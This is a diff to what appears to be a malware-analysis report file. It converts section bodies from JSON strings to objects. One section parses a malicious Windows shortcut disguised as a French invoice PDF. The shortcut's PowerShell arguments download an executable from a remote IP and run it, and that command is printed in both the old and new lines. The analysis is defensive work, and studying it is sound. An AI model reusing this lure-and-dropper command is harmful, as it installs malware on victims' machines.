@@ -5,7 +5,21 @@
     "sections": [
       {
         "auto_collapse": false,
-        "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [2.8883495815082445, 3.251834648606778, 3.6529410166871976, 3.3689019201200034]}}",
+        "body": {
+          "data": {
+            "domain": [
+              0,
+              8
+            ],
+            "values": [
+              2.8883495815082445,
+              3.251834648606778,
+              3.6529410166871976,
+              3.3689019201200034
+            ]
+          },
+          "type": "colormap"
+        },
         "body_config": {},
         "body_format": "GRAPH_DATA",
         "classification": "TLP:C",
@@ -18,7 +32,20 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"flags\": \"IDList, Description, RelativePath, WorkingDir, CommandArgs, IconFile, Unicode\", \"file_attributes\": \"Normal\", \"target_file_size\": 452608, \"icon_index\": 13, \"run_window\": \"Show Minimized No Activate\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"powershell.exe\", \"description\": \"FACTURE-JUILLET2022#3476579.pdf\", \"relative_path\": \"./powershell.exe\", \"working_directory\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\", \"command_line_arguments\": \"Invoke-WebRequest -Uri 'http://20.7.43.70/BkRCY.exe' -OutFile $env:temp\\\\file.exe; set a=ec; start $env:temp\\\\file.exe\", \"icon_file_name\": \"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\"}",
+        "body": {
+          "command_line_arguments": "Invoke-WebRequest -Uri 'http://20.7.43.70/BkRCY.exe' -OutFile $env:temp\\file.exe; set a=ec; start $env:temp\\file.exe",
+          "description": "FACTURE-JUILLET2022#3476579.pdf",
+          "file_attributes": "Normal",
+          "flags": "IDList, Description, RelativePath, WorkingDir, CommandArgs, IconFile, Unicode",
+          "hot_key": "(none)",
+          "icon_file_name": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+          "icon_index": 13,
+          "relative_path": "./powershell.exe",
+          "run_window": "Show Minimized No Activate",
+          "target_file_dosname": "powershell.exe",
+          "target_file_size": 452608,
+          "working_directory": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -60,7 +87,9 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"icon_location\": \"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\"}",
+        "body": {
+          "icon_location": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -80,7 +109,10 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"relative_path\": \"./powershell.exe\", \"target_file_dosname\": \"Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"}",
+        "body": {
+          "relative_path": "./powershell.exe",
+          "target_file_dosname": "Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
